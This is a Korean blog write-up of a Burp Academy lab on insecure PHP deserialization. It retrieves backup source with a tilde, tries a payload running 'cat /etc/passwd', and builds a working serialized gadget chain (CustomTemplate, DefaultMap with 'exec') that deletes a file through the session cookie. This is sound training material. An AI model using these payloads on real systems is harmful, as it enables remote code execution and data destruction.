---
layout: post
title: "Burp Academy-안전하지 않은 역직렬화(Insecure Deserialization) 관련 취약점: Developing a custom gadget chain for PHP deserialization"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, Insecure Deserialization]
toc: true
last_modified_at: 2024-07-31 21:00:00 +0900
---


# 개요
- 안전하지 않은 역직렬화(Insecure Deserialization) 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization
- 취약점 설명페이지: https://portswigger.net/web-security/deserialization/exploiting
- 난이도: EXPERT (어려움)


# 문제 설명
- 이 랩은 직렬화 베이스의 세션 관리 메커니즘을 사용하고 있다. 
- 당신은 적절한 개짓체인을 개발한 후, 이 랩의 취약한 역직렬화 기능을 exploit하여 원격코드실행(RCE)을 수행할 수 있다. 
- 랩을 풀려면 carlos의 홈 디렉토리에 있는 morale.txt파일을 삭제하면 된다. 
- wiener:peter 크레덴셜로 로그인할 수 있다. 
- 힌트: 가끔 파일명의 뒤에 물결표시(~)를 붙임으로서 에디터가 만든 백업파일을 얻을 수 있는 경우가 있다. 

```
This lab uses a serialization-based session mechanism. By deploying a custom gadget chain, you can exploit its insecure deserialization to achieve remote code execution. To solve the lab, delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials:

Hint
You can sometimes read source code by appending a tilde (~) to a filename to retrieve an editor-generated backup file.
```

# 도전
이번에는 PHP 역직렬화 취약점 문제다. 

## 1. 소스 코드를 입수할 수 있을지 테스트해본다. 로그인한 후의 HTML페이지의 소스코드를 보면 다음과 같이 주석에 소스 코드 경로가 들어가 있다. 

`/cgi-bin/libs/CustomTemplate.php`다. 

![](/images/burp-academy-serial-9-1.png)


## 2. 이 경로에 접근해보면 다음과 같은 아무 것도 회신해주지 않는다.

![](/images/burp-academy-serial-9-2.png)

## 3. 그러나 힌트를 참고로 뒤에 물결표시를 붙여서 `/cgi-bin/libs/CustomTemplate.php~`로 접근하면 백업파일의 소스코드를 확인할 수 있다. 다음과 같다.  

### 소스코드

```php
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

?>
```

## 4. 분석해본다. DefaultMap이 조금 수상하다. 

이 클래스를 사용하는 직렬화된 PHP오브젝트를 만들어보자. 

다음과 같이 될 것 같다. 

```
O:10:"DefaultMap":1:{s:8:"callback";s:15:"cat /etc/passwd";}
```

이 것을 Base64 인코딩해서 세션토큰에 설정해서 보내보자. 그러면 다음과 같이 에러가 회신된다. 

```
PHP Warning:  call_user_func() expects parameter 1 to be a valid callback, function &apos;cat /etc/passwd&apos; not found or invalid function name in /home/carlos/cgi-bin/libs/CustomTemplate.php on line 55
```

![](/images/burp-academy-serial-9-3.png)

이 것으로 다음을 알 수 있다. 
- 서버가 역직렬화를 시도했다. 
- callback 속성에는 실재하는 함수 이름을 지정해야 한다. 
- 소스코드는 /home/carlos/ 의 하위 경로에 존재한다. 


음... 좀더 생각해본다. 문제 설명을 보면 "개짓 체인"을 만들라고 되어 있다. 소스코드를 다시 분석해본다. 

CustomTemplate 을 만들면, 그 안에있는 build_product 함수를 통해 Product오브젝트가 만들어지게 되어 있다. 그러나 봐도 어디가 취약점이 될 수 있는지가 보이지 않는다. 


답을 본다. 

# 답 보고 풀이
1. 소스코드를 보면 `CustomTemplate`클래스의 `__wakeup()` 매직 메서드가 `default_desc_type`과 `desc` 멤버변수를 사용해서 새로운 Product오브젝트를 만드는 것을 알 수 있다. 

```php
class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}
```

2.  `DefaultMap` 클래스가 `__get()` 매직 메서드를 가지고 있다. PHP에서 `__get()` 매직 메서드는 오브젝트에 존재하지 않는 속성을 읽으려고 할 때 호출된다.  `__get()` 매직 메서드는 `call_user_func` 함수를 호출하고, 이 함수는 `DefaultMap->callback`으로 전달된 어떤 함수든 실행한다. 이 함수는 `$name` 파라메터로 전달된 값을 실행한다. 이 속성은 요청시에는 존재하지 않았던 것이다. 

※ call_user_func 함수는 PHP에 내장된 함수이다. 

```php
class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}
```

3. 위의 분석결과를 종합한다. 다음과 같이 PHP 속성을 지정하면 RCE가 될 것이다.

```php
CustomTemplate->default_desc_type = "rm /home/carlos/morale.txt";
CustomTemplate->desc = DefaultMap;
DefaultMap->callback = "exec"
```

위와 같이 설정했을 때의 소스코드의 데이터 흐름을 따라가본다. 
1) `CustomTemplate` 오브젝트를 만들면, 새로운 `Product` 오브젝트가 만들어진다. 
2) `Product`의 생성자가 `desc` 속성에 지정된 `DefaultMap`오브젝트의 `default_desc_type`에 접근한다. 
3) 이 때 `default_desc_type`의 값은 "rm /home/carlos/morale.txt", `$desc`의 값은 DefaultMap 이다.

```php
class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

```

4) 하지만 `DefaultMap`오브젝트에는 `default_desc_type` 속성이 존재하지 않기 때문에 `__get()` 매직 메서드가 호출되고, 이 메서드는 `callback`으로 지정된 `exec()` 메서드를 호출한다. 이 때 파라메터 `$name`으로 전달된 값은, `Product`를 생성할 때 `default_desc_type` 속성으로 지정된 파라메터 값인 "rm /home/carlos/morale.txt"가 된다.

```php
class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}
```

4. Base64 인코딩된 다음과 같은 직렬화된 오브젝트를 준비한다. 

```php
O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}
```

- CustomTemplate 클래스의 오브젝트에 2개의 속성이 있는 형태다. 
- 하나는 `default_desc_type`으로 값은 "rm /home/carlos/morale.txt"를 가지고 있다. 
- 하나는 `desc`고 값은 DefaultMap 오브젝트로, 이 오브젝트의 callback 속성값은 "exec"다. 


5. 페이로드를 Base64으로 인코딩해서 세션쿠키에 설정한 후에 서버로 전달하면 다음과 같이 500응답이 회신되고, 그 후에 랩이 풀렸다는 메세지 나타난다.

![](/images/burp-academy-serial-9-4.png)

![](/images/burp-academy-serial-9-success.png)
